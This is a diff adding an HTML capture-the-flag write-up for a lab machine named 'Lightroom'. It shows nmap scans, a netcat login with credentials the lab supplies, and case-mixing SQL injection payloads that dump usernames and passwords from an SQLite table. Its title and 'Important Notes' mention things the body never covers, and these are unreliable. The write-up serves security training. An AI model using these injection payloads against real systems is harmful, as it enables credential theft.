@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Skynet - W4RSH3LL</title>
+
+    <link rel="stylesheet" href="../../../css/style.css">
+    <link rel="stylesheet" href="../../../css/write_up.css">
+
+    <link rel="icon" type="image/png" href="../../../assets/favicon-96x96.png" sizes="96x96">
+    <link rel="icon" type="image/svg+xml" href="../../../assets/favicon.svg">
+    <link rel="shortcut icon" href="../../../assets/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../../assets/apple-touch-icon.png">
+    <link rel="manifest" href="../../../assets/site.webmanifest">
+</head>
+
+<body>
+
+    <!-- Background Layers -->
+    <div class="background-overlay"></div>
+    <div class="particles"></div>
+
+    <!-- Navigation -->
+    <nav>
+        <div class="logo-container">
+            <img src="../../../assets/leviathan_profil_pic.jpg" alt="W4RSH3LL Avatar" class="avatar">
+            <span class="logo-text">W4RSH3LL</span>
+            <button class="menu-toggle" aria-label="Toggle menu">&#9776;</button>
+        </div>
+
+        <ul class="menu">
+            <li><a href="../../../index.html">Home</a></li>
+            <li><a href="../../../html/about.html">About</a></li>
+            <li><a href="../../../html/projects.html">Projects</a></li>
+            <li><a href="../../../html/certifications.html">Certifications</a></li>
+            <li><a href="../../../html/documentations.html">Documentations</a></li>
+            <li><a href="../../../html/write-ups.html" class="active">Write-ups</a></li>
+            <li><a href="../../../html/skills.html">Skills</a></li>
+        </ul>
+    </nav>
+
+<main>
+    <!-- Page Content -->
+    <section class="page-content">
+        <article class="report-section">
+
+            <h1 class="section-title">Lightroom Server - Write-up</h1>
+            <img src="../lightroom/assets/lightroom_logo.png">
+
+            <!-- Overview -->
+            <h2>Machine Overview</h2>
+            <ul>
+                <li><strong>Target IP:</strong> 10.10.7.160</li>
+                <li><strong>Title:</strong> Lightroom</li>
+                <li><strong>Difficulty:</strong> Easy</li>
+            </ul>
+
+            <hr>
+
+            <h2>Important Notes</h2>
+            <ul>
+                <li><strong>Webserver:</strong> nginx 1.18.0</li>
+                <li><strong>Private Key:</strong> Requires passphrase</li>
+                <li><strong>User:</strong> saad</li>
+                <li><strong>Privesc:</strong> LD_PRELOAD</li>
+            </ul>
+
+            <hr>
+
+            <h2>Reconnaissance</h2>
+            <p>Before diving into exploitation, we conduct an <strong>Nmap scan</strong> to identify open ports and services.</p>
+
+            <h3>Scan 1: Comprehensive Scan</h3>
+            <pre><code>nmap -A -p- -T4 --script=vuln,exploit,auth,brute 10.10.7.160</code></pre>
+
+            <p><strong>Output:</strong></p>
+            <ul>
+                <li>Port <strong>22</strong> (SSH) is open.</li>
+            </ul>
+
+            <h3>Scan 2: Service and Version Detection</h3>
+            <pre><code>nmap -sC -sV -A 10.10.7.160</code></pre>
+
+            <p><strong>Output:</strong></p>
+            <ul>
+                <li>Port <strong>22</strong> (SSH) is open.</li>
+                <li><strong>Banner:</strong>
+                    <ul>
+                        <li>OpenSSH 8.2p1 Ubuntu 4ubuntu0.9</li>
+                        <li>Running: Linux 4.X</li>
+                        <li>OS details: Linux 4.15</li>
+                        <li>Network Distance: 2 hops</li>
+                        <li><strong>Service Info:</strong> OS: Linux</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <h3>Scan 3: Full Port Scan</h3>
+            <pre><code>nmap -p- 10.10.7.160</code></pre>
+
+            <p><strong>Output:</strong></p>
+            <ul>
+                <li>Port <strong>22</strong> (SSH) is open.</li>
+                <li>Port <strong>1337</strong> is open (unknown service).</li>
+            </ul>
+
+            <h3>Additional Information</h3>
+            <p>
+                <strong>Title:</strong> Light v1.2<br>
+                <strong>Target IP Address:</strong> 10.10.7.160
+            </p>
+
+            <blockquote>
+                I am working on a database application called <strong>Light</strong>!  
+                The application is running on <strong>port 1337</strong>.  
+                Connect with:<br><br>
+                <pre><code>nc 10.10.7.160 1337</code></pre>
+                Username: <strong>smokey</strong><br><br>
+                <em>Note: Service may take 2–3 minutes to fully start.</em>
+            </blockquote>
+
+            <hr>
+
+            <h2>Gaining Initial Access</h2>
+
+            <p>Using the provided username <strong>smokey</strong>:</p>
+
+            <figure>
+                <img src="../lightroom/assets/Pasted image 20250131121627.png" alt="">
+                <figcaption>Connecting to the server via Netcat.</figcaption>
+            </figure>
+
+            <pre><code>nc 10.10.7.160 1337</code></pre>
+
+            <figure>
+                <img src="../lightroom/assets/Pasted image 20250131122031.png" alt="">
+            </figure>
+
+            <p>A password is also provided:</p>
+            <pre><code>vYQ5ngPpw8AdUmL</code></pre>
+
+            <figure>
+                <img src="../lightroom/assets/Pasted image 20250131125600.png" alt="">
+            </figure>
+
+            <p>Other interactions return errors:</p>
+
+            <figure>
+                <img src="../lightroom/assets/Pasted image 20250131130443.png" alt="">
+            </figure>
+
+            <h3>Attempting SSH Access</h3>
+            <pre><code>ssh smokey@10.10.7.160</code></pre>
+
+            <figure>
+                <img src="../lightroom/assets/Pasted image 20250131125920.png" alt="">
+            </figure>
+
+            <hr>
+
+            <h2>Exploiting SQL Injection</h2>
+
+            <p>Attempting SQL injection:</p>
+
+            <pre><code>SELECT sql FROM sqlite_schema</code></pre>
+
+            <figure>
+                <img src="../lightroom/assets/Pasted image 20250131130736.png" alt="">
+            </figure>
+
+            <p>Bypass using capitalization trick:</p>
+
+            <pre><code>sELEct sql FroM sqlite_schema</code></pre>
+
+            <figure>
+                <img src="../lightroom/assets/Pasted image 20250131131400.png" alt="">
+            </figure>
+
+            <pre><code>' UniOn SeLeCt 1 '</code></pre>
+
+            <figure>
+                <img src="../lightroom/assets/Pasted image 20250131131435.png" alt="">
+            </figure>
+
+            <hr>
+
+            <h2>Extracting Database Information</h2>
+
+            <pre><code>' UniOn SeLeCt tbl_name FRom sqlite_master WhERe type='table' '</code></pre>
+
+            <figure>
+                <img src="../lightroom/assets/Pasted image 20250131131950.png" alt="">
+            </figure>
+
+            <pre><code>' UniOn SelECT sql FRom sqlite_master '</code></pre>
+
+            <figure>
+                <img src="../lightroom/assets/Pasted image 20250131132252.png" alt="">
+            </figure>
+
+            <pre><code>' UniOn SeLeCt group_concat(username) FROM usertable '</code></pre>
+
+            <pre><code>' UniOn SeLeCt group_concat(password) FROM usertable '</code></pre>
+
+            <figure>
+                <img src="../lightroom/assets/Pasted image 20250131132407.png" alt="">
+            </figure>
+
+            <figure>
+                <img src="../lightroom/assets/Pasted image 20250131132630.png" alt="">
+            </figure>
+
+            <hr>
+
+            <h2>Conclusion</h2>
+            <p>
+                Using <strong>SQL injection</strong>, we extracted credentials and obtained the final flag.  
+                This highlights the importance of <strong>input validation</strong> and <strong>secure database handling</strong>.
+            </p>
+
+        </article>
+    </section>
+</main>
+    <!-- Footer -->
+    <footer id="footer">
+        <div class="footer-container">
+            <p>&copy; 2025 W4RSH3LL. All rights reserved.</p>
+
+            <div class="footer-links">
+
+                <!-- Email -->
+                <a href="mailto:w4rsh3ll@pm.me" class="footer-link" title="Email">
+                    <svg class="footer-icon" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 
+                        1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 
+                        2-2zm0 2v.01L12 13l8-6.99V6H4zm0 
+                        12h16V8l-8 6-8-6v10z"/>
+                    </svg>
+                    <span>w4rsh3ll@pm.me</span>
+                </a>
+
+                <!-- GitHub -->
+                <a href="https://github.com/w4rsh3ll" target="_blank" class="footer-link" title="GitHub">
+                    <svg class="footer-icon" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 0C5.37 0 0 5.37 0 
+                        12c0 5.3 3.438 9.8 8.205 
+                        11.387.6.113.82-.26.82-.577v-2.256c-3.338.726-4.033-1.61-4.033-1.61-.546-1.387-1.333-1.757-1.333-1.757-1.09-.745.083-.729.083-.729 
+                        1.205.085 1.84 1.236 1.84 
+                        1.236 1.07 1.834 2.807 1.304 
+                        3.492.997.108-.775.418-1.304.762-1.604-2.665-.304-5.466-1.332-5.466-5.93 
+                        0-1.31.467-2.38 1.235-3.22-.123-.303-.535-1.523.117-3.176 
+                        0 0 1.008-.322 3.301 1.23a11.52 
+                        11.52 0 0 1 3.003-.404c1.02.005 
+                        2.047.138 3.004.404 2.291-1.552 
+                        3.297-1.23 3.297-1.23.655 1.653.243 
+                        2.873.12 3.176.77.84 1.232 
+                        1.91 1.232 3.22 0 4.61-2.807 
+                        5.624-5.48 5.922.43.37.823 1.102.823 
+                        2.222v3.293c0 .32.217.694.825.576A12.01 
+                        12.01 0 0 0 24 12c0-6.63-5.37-12-12-12z"/>
+                    </svg>
+                    <span>github.com/w4rsh3ll</span>
+                </a>
+
+                <!-- TryHackMe -->
+                <a href="https://tryhackme.com/p/W4RSH3LL" target="_blank" class="footer-link" title="TryHackMe">
+                    <svg class="footer-icon" viewBox="0 0 46.069 46.069" fill="currentColor">
+                        <g>…</g>
+                    </svg>
+                    <span>tryhackme.com/W4RSH3LL</span>
+                </a>
+
+            </div>
+        </div>
+    </footer>
+    <script src="../../../js/script.js"></script>
+</body>
+</html>
